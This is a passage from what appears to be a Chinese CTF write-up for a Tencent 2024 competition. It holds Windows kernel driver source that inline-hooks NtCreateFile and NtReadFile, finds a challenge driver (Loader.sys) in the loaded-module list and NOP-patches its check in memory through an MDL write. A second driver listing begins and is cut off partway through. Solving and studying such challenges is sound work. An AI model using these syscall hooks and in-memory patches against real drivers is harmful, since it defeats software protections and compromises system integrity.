class="title">SYSTEM_THREAD_INFORMATION</span> &#123;</span></span><br><span class="line">    LARGE_INTEGER KernelTime;</span><br><span class="line">    LARGE_INTEGER UserTime;</span><br><span class="line">    LARGE_INTEGER CreateTime;</span><br><span class="line">    ULONG WaitTime;</span><br><span class="line">    PVOID StartAddress;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    ULONG Priority;</span><br><span class="line">    LONG BasePriority;</span><br><span class="line">    ULONG ContextSwitchCount;</span><br><span class="line">    LONG State;</span><br><span class="line">    LONG WaitReason;</span><br><span class="line">&#125; SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">SYSTEM_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">    SystemProcessInformation = <span class="number">5</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemModuleInformation 11</span></span><br><span class="line"></span><br><span class="line">ULONG  <span class="title function_">myCreateFile</span><span class="params">(_Out_ PHANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER AllocationSize,</span></span><br><span class="line"><span class="params">    _In_ ULONG FileAttributes,</span></span><br><span class="line"><span class="params">    _In_ ULONG ShareAccess,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateDisposition,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateOptions,</span></span><br><span class="line"><span class="params">    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG EaLength)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Unhook();</span><br><span class="line">    FuncPtr func = (FuncPtr)target;</span><br><span class="line"></span><br><span class="line">    NTSTATUS s = func(FileHandle,DesiredAccess,ObjectAttributes,IoStatusBlock,AllocationSize,FileAttributes,ShareAccess,CreateDisposition,CreateOptions,EaBuffer,EaLength);</span><br><span class="line">    <span class="keyword">if</span> (!wcscmp(ObjectAttributes-&gt;ObjectName-&gt;Buffer, <span class="string">L&quot;\\??\\C:\\card.txt&quot;</span>)) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;call NtCreateFile(%p,%p,%S,%p,%p,%p,%p,%p,%p,%p,%p)\n&quot;</span>), FileHandle,DesiredAccess,ObjectAttributes-&gt;ObjectName-&gt;Buffer,IoStatusBlock,AllocationSize,FileAttributes,ShareAccess,CreateDisposition,CreateOptions,EaBuffer,EaLength);</span><br><span class="line">        <span class="comment">//DbgBreakPoint();</span></span><br><span class="line">        FileHandler = *FileHandle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DbgBreakPoint();</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Hook();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MDLWriteMemory(PVOID pBaseAddress, PVOID pWriteData, SIZE_T writeDataSize)</span><br><span class="line">&#123;</span><br><span class="line">    PMDL pMdl = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pNewAddress = <span class="literal">NULL</span>;</span><br><span class="line">    pMdl = MmCreateMdl(<span class="literal">NULL</span>, pBaseAddress, writeDataSize);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pMdl)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    MmBuildMdlForNonPagedPool(pMdl);</span><br><span class="line">    pNewAddress = MmMapLockedPages(pMdl, KernelMode);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pNewAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        IoFreeMdl(pMdl);</span><br><span class="line">    &#125;</span><br><span class="line">    RtlCopyMemory(pNewAddress, pWriteData, writeDataSize);</span><br><span class="line">    MmUnmapLockedPages(pNewAddress, pMdl);</span><br><span class="line">    IoFreeMdl(pMdl);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">PatchInstr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY *TE, *Tmp;</span><br><span class="line">    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;</span><br><span class="line">    PLIST_ENTRY LinkList;</span><br><span class="line">    ;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    LinkList = TE-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">    UNICODE_STRING name;</span><br><span class="line">    RtlInitUnicodeString(&amp;name,<span class="string">L&quot;Loader.sys&quot;</span>);</span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)</span><br><span class="line">    &#123;</span><br><span class="line">        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (RtlEqualUnicodeString(&amp;Tmp-&gt;BaseDllName, &amp;name,FALSE)) &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;DLLname:%S DLLBase=%p nowcode=%p\n&quot;</span>), Tmp-&gt;BaseDllName.Buffer,Tmp-&gt;DllBase,(ULONG64)(Tmp-&gt;DllBase) + <span class="number">0xa27e</span>);</span><br><span class="line">            <span class="type">char</span> buffer[] = &#123; <span class="number">0x90</span>,<span class="number">0x90</span> &#125;;</span><br><span class="line">            MDLWriteMemory((ULONG64)(Tmp-&gt;DllBase) + <span class="number">0xa27e</span>, buffer, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkList = LinkList-&gt;Flink;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ULONG <span class="title function_">myReadFile</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Unhook2();</span><br><span class="line">    FuncPtr2 func = (FuncPtr2)target2;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (FileHandler &amp;&amp; FileHandler == FileHandle) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;call NtReadFile(%p,%p,%p,%p,%p,%p,%p,%p,%p)\n&quot;</span>), FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);</span><br><span class="line">        kprintf((<span class="string">&quot;buffer in %p\n&quot;</span>), Buffer);</span><br><span class="line">        PatchInstr();</span><br><span class="line">        FileHandler = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//DbgBreakPoint();</span></span><br><span class="line">    NTSTATUS s = func(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,Buffer,Length,ByteOffset,Key);</span><br><span class="line">    </span><br><span class="line">    Hook2();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: start unload\n&quot;</span>), __LINE__);</span><br><span class="line">    Unhook();</span><br><span class="line">    Unhook2();</span><br><span class="line">    DeleteDevice(pDriver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: RegistryPath = %S\n&quot;</span>), __LINE__, RegistryPath-&gt;Buffer);</span><br><span class="line">    target = NtCreateFile;</span><br><span class="line">    target2 = NtReadFile;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: NtCreateFile=%p NtReadFile=%p\n&quot;</span>), __LINE__, target,target2);</span><br><span class="line">    g_Object = DriverObject;</span><br><span class="line">    <span class="keyword">if</span> (target&amp;&amp;target2) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(oldcode); i++) &#123;</span><br><span class="line">            oldcode[i] = target[i];</span><br><span class="line">            oldcode2[i] = target2[i];</span><br><span class="line">        &#125;</span><br><span class="line">        *(UINT64*)(newcode + <span class="number">2</span>) = myCreateFile;</span><br><span class="line">        *(UINT64*)(newcode2 + <span class="number">2</span>) = myReadFile;</span><br><span class="line">        Hook();</span><br><span class="line">        Hook2();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;xia0ji233:hahaha&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Filter</span><span class="params">(ULONG Start)</span></span><br><span class="line">&#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY *TE, *Tmp;</span><br><span class="line">    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;</span><br><span class="line">    PLIST_ENTRY LinkList;</span><br><span class="line">    ;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    LinkList = TE-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">    <span class="keyword">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)</span><br><span class="line">    &#123;</span><br><span class="line">        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;</span><br><span class="line">        ULONG BASE = Tmp-&gt;DllBase;</span><br><span class="line">        ULONG Size = Tmp-&gt;SizeOfImage;</span><br><span class="line">        <span class="keyword">if</span> (Start &gt;= BASE &amp;&amp; Start &lt; BASE + Size) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LinkList = LinkList-&gt;Flink;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，先加载我写的驱动，后加载题目驱动，无论 user-key 正确与否，都加载成功</p><img src="/2024/04/22/tencent-race-2024-pre-final/17.png" class=""><p>于是这里把修改的函数套到文件读取里面去拦截，达到读该文件时遍历模块，找到指定模块则写入指令。</p><p>下面是真正的代码（编译文件为XSafe2.sys）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CALLBACK_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LIST_ENTRY CallbackList;</span><br><span class="line">    OB_OPERATION  Operations;</span><br><span class="line">    ULONG Active;</span><br><span class="line">    PVOID Handle;</span><br><span class="line">    POBJECT_TYPE ObjectType;</span><br><span class="line">    POB_PRE_OPERATION_CALLBACK  PreOperation;</span><br><span class="line">    POB_POST_OPERATION_CALLBACK PostOperation;</span><br><span class="line">    ULONG unknown;</span><br><span class="line">&#125; CALLBACK_ENTRY, *PCALLBACK_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA</span>                         // 24 <span class="title">elements</span>, 0<span class="title">xE0</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderLinks</span>;</span>                     <span class="comment">// 2 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x010*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderLinks</span>;</span>                   <span class="comment">// 2 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x020*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderLinks</span>;</span>           <span class="comment">// 2 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x030*/</span>     VOID*        DllBase;</span><br><span class="line">    <span class="comment">/*0x038*/</span>     VOID*        EntryPoint;</span><br><span class="line">    <span class="comment">/*0x040*/</span>     ULONG32      SizeOfImage;</span><br><span class="line">    <span class="comment">/*0x044*/</span>     UINT8        _PADDING0_[<span class="number">0x4</span>];</span><br><span class="line">    <span class="comment">/*0x048*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">FullDllName</span>;</span>                      <span class="comment">// 3 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x058*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">BaseDllName</span>;</span>                      <span class="comment">// 3 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x068*/</span>     ULONG32      Flags;</span><br><span class="line">    <span class="comment">/*0x06C*/</span>     UINT16       LoadCount;</span><br><span class="line">    <span class="comment">/*0x06E*/</span>     UINT16       TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span>                                                    // 2 <span class="title">elements</span>, 0<span class="title">x10</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">/*0x070*/</span>         <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">HashLinks</span>;</span>                        <span class="comment">// 2 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span>                                               // 2 <span class="title">elements</span>, 0<span class="title">x10</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="comment">/*0x070*/</span>             VOID*        SectionPointer;</span><br><span class="line">            <span class="comment">/*0x078*/</span>             ULONG32      CheckSum;</span><br><span class="line">            <span class="comment">/*0x07C*/</span>             UINT8        _PADDING1_[<span class="number">0x4</span>];</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span>                                                    // 2 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">/*0x080*/</span>         ULONG32      TimeDateStamp;</span><br><span class="line">        <span class="comment">/*0x080*/</span>         VOID*        LoadedImports;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">/*0x088*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT</span>* <span class="title">EntryPointActivationContext</span>;</span></span><br><span class="line">    <span class="comment">/*0x090*/</span>     VOID*        PatchInformation;</span><br><span class="line">    <span class="comment">/*0x098*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ForwarderLinks</span>;</span>                       <span class="comment">// 2 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x0A8*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ServiceTagLinks</span>;</span>                      <span class="comment">// 2 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x0B8*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">StaticLinks</span>;</span>                          <span class="comment">// 2 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x0C8*/</span>     VOID*        ContextInformation;</span><br><span class="line">    <span class="comment">/*0x0D0*/</span>     UINT64       OriginalBase;</span><br><span class="line">    <span class="comment">/*0x0D8*/</span>     <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">LoadTime</span>;</span>                           <span class="comment">// 4 elements, 0x8 bytes (sizeof)</span></span><br><span class="line">&#125;LDR_DATA, *PLDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE_INITIALIZER</span>                                                                                                                                         // 25 <span class="title">elements</span>, 0<span class="title">x70</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     UINT16       Length;</span><br><span class="line">    <span class="class"><span class="keyword">union</span>                                                                                                                                                                       // 2 <span class="title">elements</span>, 0<span class="title">x1</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">/*0x002*/</span>         UINT8        ObjectTypeFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span>                                                                                                                                                                  // 7 <span class="title">elements</span>, 0<span class="title">x1</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="comment">/*0x002*/</span>             UINT8        CaseInsensitive : <span class="number">1</span>;                                                                                                                                   <span class="comment">// 0 BitPosition</span></span><br><span class="line">            <span class="comment">/*0x002*/</span>             UINT8        UnnamedObjectsOnly : <span class="number">1</span>;                                                                                                                                <span class="comment">// 1 BitPosition</span></span><br><span class="line">            <span class="comment">/*0x002*/</span>             UINT8        UseDefaultObject : <span class="number">1</span>;                                                                                                                                  <span class="comment">// 2 BitPosition</span></span><br><span class="line">            <span class="comment">/*0x002*/</span>             UINT8        SecurityRequired : <span class="number">1</span>;                                                                                                                                  <span class="comment">// 3 BitPosition</span></span><br><span class="line">            <span class="comment">/*0x002*/</span>             UINT8        MaintainHandleCount : <span class="number">1</span>;                                                                                                                               <span class="comment">// 4 BitPosition</span></span><br><span class="line">            <span class="comment">/*0x002*/</span>             UINT8        MaintainTypeList : <span class="number">1</span>;                                                                                                                                  <span class="comment">// 5 BitPosition</span></span><br><span class="line">            <span class="comment">/*0x002*/</span>             UINT8        SupportsObjectCallbacks : <span class="number">1</span>;                                                                                                                           <span class="comment">// 6 BitPosition</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">/*0x004*/</span>     ULONG32      ObjectTypeCode;</span><br><span class="line">    <span class="comment">/*0x008*/</span>     ULONG32      InvalidAttributes;</span><br><span class="line">    <span class="comment">/*0x00C*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">GENERIC_MAPPING</span> <span class="title">GenericMapping</span>;</span>                                                                                                                                     <span class="comment">// 4 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x01C*/</span>     ULONG32      ValidAccessMask;</span><br><span class="line">    <span class="comment">/*0x020*/</span>     ULONG32      RetainAccess;</span><br><span class="line">    <span class="comment">/*0x024*/</span>     <span class="class"><span class="keyword">enum</span> _<span class="title">POOL_TYPE</span> <span class="title">PoolType</span>;</span></span><br><span class="line">    <span class="comment">/*0x028*/</span>     ULONG32      DefaultPagedPoolCharge;</span><br><span class="line">    <span class="comment">/*0x02C*/</span>     ULONG32      DefaultNonPagedPoolCharge;</span><br><span class="line">    <span class="comment">/*0x030*/</span>     PVOID DumpProcedure;</span><br><span class="line">    <span class="comment">/*0x038*/</span>     PVOID OpenProcedure;</span><br><span class="line">    <span class="comment">/*0x040*/</span>     PVOID CloseProcedure;</span><br><span class="line">    <span class="comment">/*0x048*/</span>     PVOID DeleteProcedure;</span><br><span class="line">    <span class="comment">/*0x050*/</span>     PVOID ParseProcedure;</span><br><span class="line">    <span class="comment">/*0x058*/</span>     PVOID SecurityProcedure;</span><br><span class="line">    <span class="comment">/*0x060*/</span>     